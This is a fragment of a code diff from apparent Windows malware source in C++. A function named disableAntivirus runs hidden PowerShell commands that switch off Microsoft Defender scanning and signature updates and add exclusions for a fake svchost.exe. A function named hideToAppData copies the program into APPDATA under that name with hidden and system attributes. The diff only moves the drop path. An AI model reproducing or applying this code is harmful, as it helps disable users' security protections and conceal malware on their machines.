@@ -1355,7 +1355,7 @@ void disableAntivirus() {
     WinExec("powershell -Command Set-MpPreference -DisableCatchupQuickScan $true -Force 2>$null", SW_HIDE);
     WinExec("powershell -Command Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -Force 2>$null", SW_HIDE);
     WinExec("powershell -Command Add-MpPreference -ExclusionProcess \"svchost.exe\" 2>$null", SW_HIDE);
-    WinExec("powershell -Command Add-MpPreference -ExclusionPath \"$env:APPDATA\\Microsoft\\svchost.exe\" 2>$null", SW_HIDE);
+    WinExec("powershell -Command Add-MpPreference -ExclusionPath \"$env:APPDATA\\svchost.exe\" 2>$null", SW_HIDE);
     WinExec("powershell -Command Add-MpPreference -ExclusionPath \"$env:TEMP\\svchost.exe\" 2>$null", SW_HIDE);
 
     // Registry disable
@@ -1612,7 +1612,7 @@ void hideToAppData() {
     if (len == 0 || len >= MAX_PATH) return;
     char appData[MAX_PATH]; DWORD adLen = GetEnvironmentVariableA("APPDATA", appData, MAX_PATH);
     if (adLen == 0 || adLen >= MAX_PATH) return;
-    std::string dest = std::string(appData) + "\\Microsoft\\svchost.exe";
+    std::string dest = std::string(appData) + "\\svchost.exe";
     if (GetFileAttributesA(dest.c_str()) == INVALID_FILE_ATTRIBUTES || _stricmp(exePath, dest.c_str()) != 0) {
         CopyFileA(exePath, dest.c_str(), FALSE);
         SetFileAttributesA(dest.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
